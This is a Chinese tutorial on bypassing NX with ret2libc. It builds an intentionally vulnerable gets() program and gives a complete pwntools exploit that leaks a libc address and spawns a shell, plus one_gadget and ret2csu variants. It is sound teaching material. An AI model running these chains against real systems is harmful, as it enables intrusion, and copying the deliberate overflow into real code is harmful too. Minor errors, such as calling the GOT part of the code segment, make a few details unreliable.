---
title: "案例三：ret2libc——绕过NX保护"
type: docs
weight: 3
---

## 案例三：ret2libc——绕过NX保护

案例二中，我们通过在栈上注入shellcode获得了shell。但这种攻击方式有一个前提：栈上的数据必须是可执行的。现代操作系统通过NX（No-eXecute）保护彻底封堵了这条路。本案例将演示如何在NX开启的环境下，利用程序自身链接的libc库中的代码完成攻击——这就是ret2libc（Return-to-libc）技术。

### NX保护机制深度解析

#### 什么是NX

NX（Intel称为XD，eXecute Disable）是CPU硬件级别的内存页保护机制。它将内存页标记为"只可读写"或"只可读写执行"两类。当CPU试图执行标记为"不可执行"的内存页上的指令时，会触发段错误（Segmentation Fault），程序直接崩溃。

操作系统通过mmap/mprotect系统调用管理页的权限标志。在Linux中，栈和堆默认被标记为`rw-`（读写，不可执行），而代码段（.text）被标记为`r-x`（读执行，不可写）。

```text
典型的进程内存布局及权限：

地址从低到高：
┌─────────────────────┐
│   .text (代码段)     │  r-x  ← 可执行，但内容固定
├─────────────────────┤
│   .rodata (只读数据) │  r--  ← 不可写，不可执行
├─────────────────────┤
│   .data / .bss      │  rw-  ← 可读写，不可执行
├─────────────────────┤
│   堆 (heap)         │  rw-  ← 向高地址增长
│       ...           │
├─────────────────────┤
│   内存映射区 (mmap)  │  由mmap/mprotect决定
├─────────────────────┤
│   栈 (stack)        │  rw-  ← 向低地址增长，不可执行！
└─────────────────────┘
```

#### NX开启与关闭的编译差异

```bash
# 关闭NX（案例二的方式）—— 栈可执行
gcc -z execstack -fno-stack-protector -no-pie -o vuln vuln.c

# 开启NX（现代Linux默认）—— 栈不可执行
gcc -fno-stack-protector -no-pie -o vuln vuln.c
```

验证NX状态的三种方式：

```bash
# 方法1：readelf查看GNU_STACK段
readelf -l ./vuln3 | grep GNU_STACK
# 开启NX时显示：GNU_STACK  0x000000  RWE  （RWE=可读写执行=关闭NX）
# 开启NX时显示：GNU_STACK  0x000000  RW   （RW=仅读写=开启NX）

# 方法2：checksec工具（pwntools自带）
checksec --file=./vuln3

# 方法3：在Python/pwntools中查看
# from pwn import *
# elf = ELF('./vuln3')
# print(elf.nx)  # True=开启，False=关闭
```

#### 为什么案例二的shellcode方法失效

在案例二中，我们的攻击链是：溢出→覆盖返回地址为栈上shellcode地址→CPU跳转到栈上执行shellcode。

NX开启后，栈上存储的数据（包括我们的shellcode）被标记为不可执行。CPU尝试在栈上取指令时，硬件直接触发异常，shellcode一行都执行不了。

```text
案例二的攻击链（NX关闭）：
栈上: [shellcode][覆盖返回地址→指向shellcode]
                  ↓
CPU跳转到栈上 → 执行shellcode → 获取shell ✓

案例二的方法在NX开启时：
栈上: [shellcode][覆盖返回地址→指向shellcode]
                  ↓
CPU跳转到栈上 → 硬件异常：该页不可执行 → 段错误 ✗
```

#### ret2libc的核心思想

既然栈上的代码不能执行，那就借用已经在内存中的、被标记为可执行的代码。程序运行时，libc（C标准库）被加载到进程地址空间中，其代码段自然是可执行的。

ret2libc的核心思路：

1. 不在栈上放shellcode，而是放精心构造的"返回地址链"
2. 利用`ret`指令逐级跳转到libc中的函数
3. 将`system("/bin/sh")`作为最终目标调用

libc中天然存在我们需要的一切：
- `system()`函数：执行任意shell命令
- `"/bin/sh"`字符串：作为system的参数
- `pop rdi; ret`等gadget：用于传参

```text
ret2libc攻击链：
栈上: [填充][返回地址→pop rdi; ret][参数→"/bin/sh"地址][→system地址]
       ↓          ↓                      ↓                  ↓
     溢出     弹出"/bin/sh"地址到rdi   设置好参数        调用system("/bin/sh")
```

### 目标程序

```c
// vuln3.c
#include <stdio.h>
#include <string.h>

void vuln() {
    char buffer[64];
    printf("输入: ");
    gets(buffer);  // 经典的栈溢出：gets没有长度限制
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);  // 关闭stdout缓冲，确保printf立即输出
    vuln();
    return 0;
}
```

这段代码与案例一几乎相同，唯一的区别在编译选项上——我们将开启NX保护。

### 编译与环境确认

```bash
# 编译：开启NX（默认），关闭栈保护和PIE便于分析
gcc -g -fno-stack-protector -no-pie -o vuln3 vuln3.c
```

编译选项说明：

| 选项 | 作用 | 本案例设置 |
|------|------|-----------|
| `-g` | 保留调试信息 | 开启，便于gdb分析 |
| `-fno-stack-protector` | 关闭栈金丝雀保护 | 关闭，简化溢出 |
| `-no-pie` | 关闭地址随机化（代码段） | 关闭，地址固定 |
| NX（默认开启） | 栈不可执行 | **开启**，这是本案例的核心 |
| ASLR | libc地址随机化 | **开启**，需要泄露地址 |

验证保护状态：

```bash
$ checksec --file=./vuln3
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled          ← 关键：NX已开启
    PIE:      No PIE (0x400000)   ← 代码段地址固定
    RWX:      Has RWX segments    ← 可能有部分可读写执行段（不影响栈）
```

### 为什么需要两次溢出

这是本案例最关键的概念，也是初学者最容易困惑的地方。

#### ASLR带来的挑战

Linux默认开启ASLR（Address Space Layout Randomization），每次程序运行时libc的加载基址都会变化。我们虽然知道libc中`system()`和`"/bin/sh"`的偏移，但不知道libc加载到内存中的实际基址，就无法算出它们的真实地址。

```text
ASLR效果：
第1次运行：libc基址 = 0x7ffff7a00000
第2次运行：libc基址 = 0x7ffff7c1d000
第3次运行：libc基址 = 0x7ffff7b52000
每次都不一样！
```

#### 解题思路：先泄露，再攻击

既然不知道libc基址，就需要先让它"泄露"出来。利用的原理是：程序调用外部函数时，必须通过GOT（Global Offset Table）存储函数的真实地址。GOT在代码段，地址固定（因为关闭了PIE）。如果我们能用`puts()`打印GOT表中某个函数的地址，就能得到libc中该函数的真实地址。

已知条件：
- libc中任意函数的真实地址 = libc基址 + 该函数在libc中的偏移
- 我们可以获取到puts的真实地址（通过GOT泄露）
- 我们知道本地libc中puts的偏移（从libc文件中读取）

因此：`libc基址 = puts真实地址 - puts偏移`

然后：`system真实地址 = libc基址 + system偏移`

#### 两次溢出的分工

```text
第一次溢出（泄露地址）：
目标：调用 puts(puts@GOT) → 打印puts的真实地址 → 返回main重新执行

栈布局：
[72字节填充][pop rdi; ret地址][puts@GOT地址][puts@PLT地址][main地址]
             ↓                  ↓             ↓             ↓
         设置rdi参数       要打印的地址    调用puts      回到main再次利用

第二次溢出（执行攻击）：
目标：调用 system("/bin/sh")

栈布局：
[72字节填充][ret地址][pop rdi; ret地址]["/bin/sh"地址][system地址]
             ↓         ↓                 ↓               ↓
          栈对齐    设置rdi参数       system的参数    获取shell!
```

### 逐步Exploit编写

#### 第一步：确定溢出偏移

使用gdb或pattern定位buffer到返回地址的距离：

```bash
# 方法1：使用gdb
gdb ./vuln3
(gdb) disas vuln
# 查看buffer的栈帧大小，通常 = buffer大小 + 8字节rbp
# buffer[64] + rbp[8] = 72字节

# 方法2：使用cyclic精确定位
# 在gdb中输入cyclic生成的pattern，观察崩溃时rip的值
python3 -c "from pwn import *; print(cyclic_find(0x...))"
```

本程序buffer为64字节，加上8字节的saved RBP，偏移为**72字节**。

#### 第二步：查找ROP gadget

需要`pop rdi; ret` gadget来设置函数的第一个参数（x86_64下第一个参数通过rdi传递）。

```python
from pwn import *

elf = ELF('./vuln3')
rop = ROP(elf)

# 查找 pop rdi; ret
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
print(f"pop rdi; ret @ {hex(pop_rdi)}")  # 例如 0x401196

# 查找 ret（用于栈对齐）
ret = rop.find_gadget(['ret'])[0]
print(f"ret @ {hex(ret)}")  # 例如 0x401016
```

**为什么需要单独的ret指令？** x86_64的System V ABI要求调用`system()`时栈是16字节对齐的。经过多次ROP跳转后栈指针可能不满足对齐要求，额外加一个`ret`指令可以将RSP调整8字节，恢复16字节对齐。如果省略这个ret，system内部的movaps指令可能触发段错误。

#### 第三步：编写泄露payload

```python
# 第一次payload：泄露puts的真实地址
payload1 = b'A' * 72            # 填充buffer + saved RBP
payload1 += p64(pop_rdi)        # 返回到 pop rdi; ret
payload1 += p64(elf.got['puts']) # puts@GOT表项地址 → 被pop到rdi
payload1 += p64(elf.plt['puts']) # 调用puts，打印rdi指向的内容
payload1 += p64(elf.symbols['main']) # puts返回后跳回main，准备第二次溢出
```

执行过程的栈状态变化：

```text
执行gets前（正常栈帧）：
    RSP → [返回地址(main)]
    RBP → [saved RBP]

溢出后payload覆盖栈：
    RSP → [72字节 'AAAA...']
          [pop_rdi地址]       ← 返回地址被覆盖
    ↓ ret指令跳转到 pop_rdi
          [puts@GOT地址]      ← pop rdi 将此值放入rdi寄存器
    ↓ ret指令继续跳转
          [puts@PLT地址]      ← 调用 puts(rdi) → 打印puts真实地址
    ↓ puts返回
          [main地址]          ← 回到main，可以再次溢出
```

#### 第四步：解析泄露地址

```python
p = process('./vuln3')
p.recvuntil(b'输入: ')
p.sendline(payload1)

# 接收puts打印的地址（8字节，可能有\n截断）
leaked_bytes = p.recvline().strip()
leaked = u64(leaked_bytes.ljust(8, b'\x00'))
print(f"泄露的puts地址: {hex(leaked)}")
# 典型输出：0x7ffff7e4a550（每次运行可能不同）
```

**解析要点：**
- `strip()`去掉末尾的换行符
- `ljust(8, b'\x00')`是因为地址高位可能为0x00，被strip或传输截断，需要补零
- `u64`将8字节转为整数

#### 第五步：计算libc地址

```python
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 计算libc基址
libc_base = leaked - libc.symbols['puts']
print(f"libc基址: {hex(libc_base)}")

# 计算system和"/bin/sh"的真实地址
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

print(f"system @ {hex(system_addr)}")
print(f"/bin/sh @ {hex(bin_sh_addr)}")
```

**关键数学关系：**
```text
libc基址 = 泄露地址(puts真实地址) - puts在libc中的偏移
system真实地址 = libc基址 + system在libc中的偏移
"/bin/sh"真实地址 = libc基址 + "/bin/sh"在libc中的偏移
```

#### 第六步：构造攻击payload

```python
# 第二次payload：调用system("/bin/sh")
payload2 = b'A' * 72            # 填充buffer + saved RBP
payload2 += p64(ret)            # 栈对齐（16字节对齐）
payload2 += p64(pop_rdi)        # pop rdi; ret
payload2 += p64(bin_sh_addr)    # "/bin/sh"的地址 → 被pop到rdi
payload2 += p64(system_addr)    # 调用 system("/bin/sh")

p.recvuntil(b'输入: ')
p.sendline(payload2)
p.interactive()  # 获取交互式shell
```

### 完整Exploit代码

```python
#!/usr/bin/env python3
"""
ret2libc exploit for vuln3.c
绕过NX保护，通过泄露libc地址调用system("/bin/sh")
"""
from pwn import *

# ============ 配置 ============
context.binary = elf = ELF('./vuln3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'info'  # 调试时改为 'debug'

# ============ ROP gadgets ============
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
log.info(f"pop rdi; ret @ {hex(pop_rdi)}")
log.info(f"ret @ {hex(ret)}")

# ============ 第一次溢出：泄露puts地址 ============
p = process('./vuln3')

payload1  = b'A' * 72                  # buffer(64) + rbp(8)
payload1 += p64(pop_rdi)               # pop rdi; ret
payload1 += p64(elf.got['puts'])        # rdi = puts@GOT（puts的真实地址）
payload1 += p64(elf.plt['puts'])        # 调用puts(rdi) → 打印地址
payload1 += p64(elf.symbols['main'])    # 返回main，准备第二次溢出

p.recvuntil(b'输入: ')
p.sendline(payload1)

# ============ 解析泄露地址 ============
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"puts真实地址: {hex(leaked)}")

# ============ 计算libc偏移 ============
libc_base = leaked - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"libc基址: {hex(libc_base)}")
log.info(f"system: {hex(system_addr)}")
log.info(f"/bin/sh: {hex(bin_sh_addr)}")

# ============ 第二次溢出：获取shell ============
payload2  = b'A' * 72
payload2 += p64(ret)                    # 栈对齐
payload2 += p64(pop_rdi)                # pop rdi; ret
payload2 += p64(bin_sh_addr)            # rdi = "/bin/sh"
payload2 += p64(system_addr)            # system("/bin/sh")

p.recvuntil(b'输入: ')
p.sendline(payload2)

log.success("Shell获取成功！")
p.interactive()
```

### 调试与验证

#### 用GDB单步跟踪

```bash
# 启动gdb，设置断点在vuln函数
gdb ./vuln3
(gdb) set follow-fork-mode parent
(gdb) b vuln
(gdb) r

# 在vuln函数入口处，观察栈布局
(gdb) x/20gx $rsp
# 正常情况下rsp上方是返回地址和saved rbp

# 继续执行到gets返回后
(gdb) ni
# 输入payload，观察栈被覆盖的情况
(gdb) x/20gx $rsp
# 可以看到我们的ROP链已经覆盖了栈

# 逐步执行ROP链
(gdb) si  # 单步执行一条指令
# 观察：
# 1. ret指令跳转到pop_rdi
# 2. pop rdi将puts@GOT弹入rdi
# 3. ret跳转到puts@PLT
# 4. puts打印内容后返回到main
```

#### 验证泄露地址的正确性

```python
# 在exploit中添加验证逻辑
# 方法1：对比两次泄露（关闭ASLR时地址应相同）
# 方法2：检查地址是否在合理的libc范围内
assert 0x7f0000000000 < leaked < 0x800000000000, \
    f"泄露地址 {hex(leaked)} 不在合理范围内，可能泄露失败"

# 方法3：检查计算出的libc基址页对齐
assert libc_base & 0xfff == 0, \
    f"libc基址 {hex(libc_base)} 未页对齐，计算可能有误"
```

#### 常见调试场景

```python
# 场景1：puts只打印了部分地址
# 原因：地址中包含\x00被截断
# 解决：使用recvuntil或recv(6)精确接收
leaked_bytes = b''
while len(leaked_bytes) < 6:
    leaked_bytes += p.recv(1)
leaked = u64(leaked_bytes.ljust(8, b'\x00'))

# 场景2：第二次溢出时收到SIGSEGV
# 原因：栈未16字节对齐
# 解决：确保payload2中有额外的ret指令

# 场景3：收到SIGABRT而非shell
# 原因：system函数内部检测到栈对齐问题
# 解决：同上，加ret指令对齐
```

### 前置知识：x86_64调用约定

理解ret2libc必须掌握x86_64的System V ABI调用约定：

```text
函数调用时参数传递顺序：
  第1个参数 → rdi
  第2个参数 → rsi
  第3个参数 → rdx
  第4个参数 → rcx
  第5个参数 → r8
  第6个参数 → r9
  第7个+参数 → 通过栈传递

函数调用指令序列：
  call func  等价于：
    push rip          ; 保存返回地址
    jmp func          ; 跳转到函数

函数返回指令序列：
  ret  等价于：
    pop rip           ; 弹出返回地址，跳转过去
```

所以`system("/bin/sh")`的调用等价于：
1. rdi = "/bin/sh"的地址
2. 跳转到system的代码

在ROP链中，我们用`pop rdi; ret` gadget代替步骤1，用直接跳转到system地址代替步骤2。

### 进阶变体

#### 变体一：使用one_gadget减少ROP链长度

`one_gadget`是一个工具，可以找到libc中满足特定约束条件时直接执行`execve("/bin/sh", NULL, NULL)`的地址。如果约束满足，只需跳转到这一个地址即可，不需要设置rdi参数。

```bash
# 安装one_gadget
gem install one_gadget

# 查找libc中的one_gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# 输出类似：
# 0xe3b01 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
# 0xe3b04 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [[rsp+0x40]] == NULL
```

使用one_gadget的简化exploit：

```python
# 泄露libc基址后，直接用one_gadget
one_gadget_offset = 0xe3b01  # 从one_gadget输出中选择
one_gadget_addr = libc_base + one_gadget_offset

# 只需要一次跳转，payload更短
payload2  = b'A' * 72
payload2 += p64(one_gadget_addr)

# 注意：one_gadget的约束条件可能不总是满足
# 需要多次尝试或通过调整栈布局来满足约束
```

#### 变体二：使用__libc_start_main泄露

如果puts不在GOT表中（例如程序没有调用puts），可以泄露其他函数。`__libc_start_main`几乎在所有程序中都存在：

```python
# 泄露__libc_start_main的真实地址
payload1  = b'A' * 72
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['__libc_start_main'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])

# 计算libc基址
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['__libc_start_main']
```

#### 变体三：ret2csu通用gadget

当程序中找不到`pop rdi; ret`等gadget时，可以利用`__libc_csu_init`中自带的通用gadget。几乎所有动态链接的程序都有这个函数。

```python
# __libc_csu_init中的gadget（地址在代码段，固定）
csu_pop = 0x40119a    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x401180   # mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]

def ret2csu(func_ptr, rdi, rsi, rdx):
    """构造ret2csu调用链"""
    payload  = p64(csu_pop)
    payload += p64(0)          # rbx = 0
    payload += p64(1)          # rbp = 1（call后会比较rbp和rbx，需要rbp=rbx+1）
    payload += p64(func_ptr)   # r12 = 要调用的函数指针（call [r12+rbx*8]）
    payload += p64(rdi)        # r13 → edi（第一个参数）
    payload += p64(rsi)        # r14 → rsi（第二个参数）
    payload += p64(rdx)        # r15 → rdx（第三个参数）
    payload += p64(csu_call)
    # csu_call执行完后会执行 add rsp, 8; pop rbx~r15; ret
    # 需要额外填充7个qword
    payload += b'B' * 56       # 7 * 8 = 56字节的填充
    return payload
```

#### 变体四：远程环境下的libc匹配

本地调试和远程目标的libc版本可能不同，导致偏移错误：

```bash
# 获取远程libc（如果可以获取目标文件）
# 方法1：如果远程服务器有文件下载漏洞
scp user@target:/lib/x86_64-linux-gnu/libc.so.6 ./remote_libc.so

# 方法2：使用LibcSearcher（根据泄露地址推断libc版本）
pip install LibcSearcher
```

```python
# 使用LibcSearcher自动匹配libc
from LibcSearcher import *

leaked_puts = 0x7ffff7e4a550  # 泄露到的puts地址
libc = LibcSearcher('puts', leaked_puts)

# 可能返回多个候选libc版本，需要更多信息确认
# 泄露第二个函数的地址来缩小范围
libc.add_condition('__libc_start_main', leaked_start_main)
# 下载匹配的libc
libc.dump('system')
libc.dump('str_bin_sh')
```

### 常见错误与排查

| 错误现象 | 可能原因 | 排查方法 |
|---------|---------|---------|
| 泄露地址为0或乱码 | GOT表未解析/偏移错误 | 用gdb检查`elf.got['puts']`的值 |
| 程序直接崩溃不打印 | payload未正确触发溢出 | 检查偏移是否为72 |
| 泄露地址最高字节不是0x7f | 字节序或接收逻辑错误 | 打印raw bytes确认 |
| system调用时SIGSEGV | 栈未16字节对齐 | 在system前加ret指令 |
| SIGABRT (glibc detected) | 对齐问题或栈被破坏 | 检查payload长度和对齐 |
| 远程打不通但本地可以 | libc版本不同 | 使用远程libc或LibcSearcher |
| "sh: 1: not found" | /bin/sh地址算错 | 验证libc_base计算 |

### 攻击效果验证

```bash
# 运行exploit
$ python3 exploit.py
[*] '/tmp/vuln3'
    Arch:     amd64-64-little
[+] Starting local process './vuln3': pid 12345
[*] pop rdi; ret @ 0x401196
[*] 泄露的puts地址: 0x7ffff7e4a550
[*] libc基址: 0x7ffff7a00000
[*] system: 0x7ffff7a52310
[*] /bin/sh: 0x7ffff7bba031
[+] Shell获取成功！
[*] Switching to interactive mode
$ whoami
kyle
$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle)
$ exit
[*] Got EOF while reading in interactive
```

### 与其他案例的对比

| 维度 | 案例二(Shellcode) | 案例三(ret2libc) |
|------|------------------|-----------------|
| NX状态 | 关闭（栈可执行） | **开启（栈不可执行）** |
| 攻击方式 | 注入shellcode到栈上 | ROP链调用libc函数 |
| 是否需要知道libc地址 | 不需要 | **需要泄露** |
| 溢出次数 | 1次 | **2次**（泄露+攻击） |
| payload复杂度 | 低（shellcode直接放栈上） | 高（需要构造ROP链） |
| 适用场景 | NX关闭的老旧环境 | **现代Linux默认环境** |

### 总结

ret2libc是绕过NX保护的基础技术，核心思想是"借用"已加载的libc代码来执行攻击。掌握这一技术需要理解以下要点：

1. **NX保护的本质**：硬件级别的内存页权限控制，使栈上的数据不可执行
2. **两次溢出的必要性**：ASLR导致libc地址未知，需要先泄露再攻击
3. **GOT/PLT机制**：外部函数通过GOT表间接调用，而GOT表在地址固定的代码段中
4. **ROP链构造**：利用gadget（pop rdi; ret）设置函数参数，通过ret指令链式跳转
5. **栈对齐**：x86_64下调用system等函数需要16字节栈对齐

这是从"注入自己的代码"到"利用已有代码"的思维跃迁，后续的高级ROP技术（SROP、ret2dlresolve等）都建立在这个基础之上。
